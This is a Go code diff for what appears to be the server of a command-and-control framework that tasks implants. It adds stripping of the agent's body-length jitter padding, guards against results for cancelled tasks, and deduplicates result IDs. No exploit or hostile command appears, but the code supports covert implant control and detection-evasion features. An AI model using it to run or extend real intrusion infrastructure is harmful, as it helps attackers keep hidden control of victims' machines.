@@ -752,6 +752,10 @@ func (s *Server) handleBeacon(c *gin.Context) {
 	// Strip request-side malleable wrapping the agent applied to the OUTGOING
 	// beacon body before decoding the envelope.
 	raw = s.stripMalleableRequest(raw)
+	// Strip the agent's ContentLengthJitter length-prefixed padding (no-op on
+	// unpadded/envelope bodies) so the JSON parser always sees clean envelope
+	// bytes regardless of per-beacon body length variance.
+	raw = s.stripBodyPadding(raw)
 
 	env, req, kind := s.decodeBeaconEnvelope(raw)
 	if kind == frameRejected {
@@ -1203,6 +1207,22 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		if !ok {
 			continue
 		}
+		// Finality guard (P6): a cancelled task is terminal. The agent may have
+		// run the command before the abort reached it; its result must not
+		// resurrect the task row.
+		if task.Status == "cancelled" {
+			slog.Info("Result for cancelled task dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type)
+			s.decrementPendingTasks(uuid)
+			continue
+		}
+		// Durable idempotency (P8): the agent reseeds results with the same rid
+		// after a dropped frame, so an exact rid that was already applied must
+		// not be applied a second time (this check survives server restarts,
+		// unlike the in-memory dedup cache).
+		if r.ResultID != "" && task.LastResultID == r.ResultID && (task.Status == "completed" || task.Status == "failed") {
+			slog.Debug("Duplicate task result dropped (durable)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
+			continue
+		}
 		if task.AcknowledgedAt == nil {
 			acknowledgedAt := now
 			task.AcknowledgedAt = &acknowledgedAt
@@ -1215,15 +1235,7 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		task.UpdatedAt = now
 
 		// Decrement per-agent pending task counter (delete key at zero to avoid leak)
-		s.agentPendingTasksMu.Lock()
-		if n := s.agentPendingTasks[uuid]; n > 0 {
-			if n-1 <= 0 {
-				delete(s.agentPendingTasks, uuid)
-			} else {
-				s.agentPendingTasks[uuid] = n - 1
-			}
-		}
-		s.agentPendingTasksMu.Unlock()
+		s.decrementPendingTasks(uuid)
 
 		// For monitoring control tasks, do not retain them in DB at all
 		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
@@ -1382,15 +1394,19 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		// Encrypt Result/Error at rest (H3): build a DB copy so the in-memory
 		// `task` stays plaintext for the WebSocket broadcast and task callback
 		// below, while only the persisted ciphertext differs.
+		if r.ResultID != "" {
+			task.LastResultID = r.ResultID
+		}
 		dbTask := *task
 		dbTask.EncryptTaskFields()
 		if err := s.db.Model(task).Updates(map[string]interface{}{
-			"status":      task.Status,
-			"result":      dbTask.Result,
-			"error":       dbTask.Error,
-			"progress":    task.Progress,
-			"total_bytes": task.TotalBytes,
-			"transferred": task.Transferred,
+			"status":         task.Status,
+			"result":         dbTask.Result,
+			"error":          dbTask.Error,
+			"progress":       task.Progress,
+			"total_bytes":    task.TotalBytes,
+			"transferred":    task.Transferred,
+			"last_result_id": task.LastResultID,
 		}).Error; err != nil {
 			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
 		}
@@ -1549,6 +1565,20 @@ func (s *Server) processTaskAcknowledgements(agentID string, taskIDs []uint, now
 	}
 }
 
+// decrementPendingTasks releases one slot of the per-agent pending-task
+// counter, deleting the key at zero to avoid a per-agent memory leak.
+func (s *Server) decrementPendingTasks(agentID string) {
+	s.agentPendingTasksMu.Lock()
+	if n := s.agentPendingTasks[agentID]; n > 0 {
+		if n-1 <= 0 {
+			delete(s.agentPendingTasks, agentID)
+		} else {
+			s.agentPendingTasks[agentID] = n - 1
+		}
+	}
+	s.agentPendingTasksMu.Unlock()
+}
+
 func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string, now time.Time) {
 	// Batch-load all tasks referenced by any relayed child
 	relayTaskIDs := make([]uint, 0, len(relayed)*2)
@@ -1602,6 +1632,16 @@ func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string,
 			if !ok || !strings.EqualFold(task.AgentID, rd.AgentID) {
 				continue
 			}
+			// Finality guard (P6): a cancelled task is terminal even for relayed
+			// children; the result must not resurrect the row.
+			if task.Status == "cancelled" {
+				s.decrementPendingTasks(rd.AgentID)
+				continue
+			}
+			// Durable idempotency (P8): exact rid already applied once.
+			if r.ResultID != "" && task.LastResultID == r.ResultID && (task.Status == "completed" || task.Status == "failed") {
+				continue
+			}
 			task.Status = "completed"
 			if r.Error != "" {
 				task.Status = "failed"
@@ -1610,15 +1650,10 @@ func (s *Server) processRelayedResults(relayed []relayedData, parentUUID string,
 			task.UpdatedAt = now
 
 			// Decrement per-agent pending task counter (delete key at zero to avoid leak)
-			s.agentPendingTasksMu.Lock()
-			if n := s.agentPendingTasks[rd.AgentID]; n > 0 {
-				if n-1 <= 0 {
-					delete(s.agentPendingTasks, rd.AgentID)
-				} else {
-					s.agentPendingTasks[rd.AgentID] = n - 1
-				}
+			s.decrementPendingTasks(rd.AgentID)
+			if r.ResultID != "" {
+				task.LastResultID = r.ResultID
 			}
-			s.agentPendingTasksMu.Unlock()
 			if r.Encoding == "base64" && r.Output != "" {
 				decoded, err := base64.StdEncoding.DecodeString(r.Output)
 				if err == nil {
